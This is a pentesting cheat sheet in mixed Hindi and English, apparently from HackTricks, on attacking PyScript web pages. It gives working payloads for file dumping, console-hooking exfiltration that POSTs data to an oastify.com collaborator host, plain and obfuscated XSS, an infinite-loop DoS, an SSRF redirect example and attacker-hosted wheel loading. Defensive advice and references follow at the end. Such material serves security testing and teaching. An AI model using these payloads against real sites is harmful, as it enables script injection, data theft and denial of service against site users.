# Pyscript

## PyScript Pentesting Guide

PyScript HTML में Python को integrate करने के लिए विकसित किया गया एक नया framework है, ताकि इसका उपयोग HTML के साथ किया जा सके। इस cheat sheet में, आप जानेंगे कि अपने penetration testing उद्देश्यों के लिए PyScript का उपयोग कैसे करें।

### Emscripten virtual memory filesystem से files Dumping / Retrieving:

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
Code:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
परिणाम:

![PyScript Pentesting Guide - Emscripten virtual memory filesystem से files Dumping / Retrieving: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
Code:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
परिणाम:

![Dumping / Retrieving files from the Emscripten virtual memory filesystem - OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (Ordinary)

Code:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
परिणाम:

![Emscripten virtual memory filesystem का OOB Data Exfiltration (console monitoring) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

Code:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
परिणाम:

![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (JavaScript Obfuscation)

कोड:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
Result:

![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (अनंत लूप)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS attack (अनंत लूप)

Code:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
Result:

![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Infinity loop):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## नई vulnerabilities & techniques (2023-2025)

### Server-Side Request Forgery via uncontrolled redirects (CVE-2025-50182)

`urllib3 >= 2.2.0, < 2.5.0` Pyodide के browser transport के साथ उपयोग किए जाने पर `redirect` और `retries` request parameters को अनदेखा करता है। यदि कोई attacker target URLs को प्रभावित कर सकता है, तो code cross-domain redirects को follow कर सकता है, भले ही उसे उन्हें disable करने के लिए urllib3 से कहा गया हो, जिससे SSRF defenses कमजोर हो जाते हैं।<sup>[[1]](#references)[[4]](#references)</sup>
```html
<script type="py">
import urllib3
http = urllib3.PoolManager()
r = http.request(
"GET",
"https://evil.example/302",
retries=False,
redirect=False,
)  # ignored by affected Pyodide/browser runtimes
print(r.status, r.url)
</script>
```
Node.js के लिए `urllib3 >= 2.5.0` पर upgrade करें, लेकिन browsers में redirects को disable करने के लिए urllib3 पर निर्भर न रहें; इसके बजाय requests करने से पहले destinations को validate या allow-list करें।<sup>[[4]](#references)</sup>

### Arbitrary package loading और supply-chain attacks

PyScript का Pyodide configuration `packages` में arbitrary wheel URLs स्वीकार करता है; यदि कोई attacker उस configuration को modify या inject कर सकता है, तो subsequent import victim के browser में attacker-controlled Python execute कर सकता है।<sup>[[5]](#references)[[6]](#references)</sup>
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code at import
</script>
```
Pyodide पैकेज के WebAssembly build के बिना arbitrary URLs से pure-Python wheels install कर सकता है।<sup>[[6]](#references)</sup> इस configuration को developer-controlled रखें, exact package names या URLs को allow-list करें, और build या deployment के दौरान remote wheel digests verify करें।

### Output sanitisation changes (2023+)

* 2022.05.1 implementation में, जिसका उपयोग legacy examples में किया गया है, `print()` बिना HTML escaping के `text/plain` output लिखता है और इसलिए XSS-prone है।<sup>[[8]](#references)</sup>
* वर्तमान `display()` helper plain strings के लिए default रूप से HTML को **escapes** करता है; raw markup को `pyscript.HTML()` में wrap करना आवश्यक है।<sup>[[2]](#references)</sup>
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
Untrusted input के लिए `display()` का उपयोग करें और untrusted strings को `HTML()` में पास न करें।<sup>[[2]](#references)</sup>

---

## Defensive Best Practices

* **Packages को up to date रखें** – Node.js में `urllib3 >= 2.5.0` का उपयोग करें और browser redirect assumptions की अलग से समीक्षा करें।<sup>[[4]](#references)</sup>
* **Package sources को प्रतिबंधित करें** – PyPI names या exact trusted URLs को allow-list करें, और build या deployment के दौरान remote wheel digests verify करें।<sup>[[5]](#references)[[6]](#references)</sup>
* **Content Security Policy को harden करें** – inline JavaScript (`script-src 'self' 'sha256-…'`) को disallow करें, ताकि injected `<script>` blocks execute न हो सकें।
* **User-supplied `<py-script>` / `<script type="py">` tags को disallow करें** – अन्य users को वापस echo करने से पहले server पर HTML को sanitise करें।
* **Workers को isolate करें** – यदि आपको workers से DOM तक synchronous access की आवश्यकता नहीं है, तो `sync_main_only` flag enable करें ताकि `SharedArrayBuffer` और उससे जुड़ी CORS header requirements से बचा जा सके।<sup>[[5]](#references)</sup>

## References

- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [2] [PyScript Built-ins documentation – `display` और `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [3] [Cyber Guy - Vulnerability Chaining की कला (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
- [4] [urllib3 security advisory – CVE-2025-50182](https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5)
- [5] [PyScript configuration documentation – packages और `sync_main_only`](https://docs.pyscript.net/2026.7.3/user-guide/configuration/)
- [6] [Pyodide – packages लोड करना](https://pyodide.org/en/stable/usage/loading-packages.html)
- [7] [NVD – CVE-2022-30286](https://nvd.nist.gov/vuln/detail/CVE-2022-30286)
- [8] [PyScript 2022.05.1 `pyscript.py` implementation](https://github.com/pyscript/pyscript/blob/2022.05.1/pyscriptjs/src/pyscript.py)
{{#include ../../banners/hacktricks-training.md}}
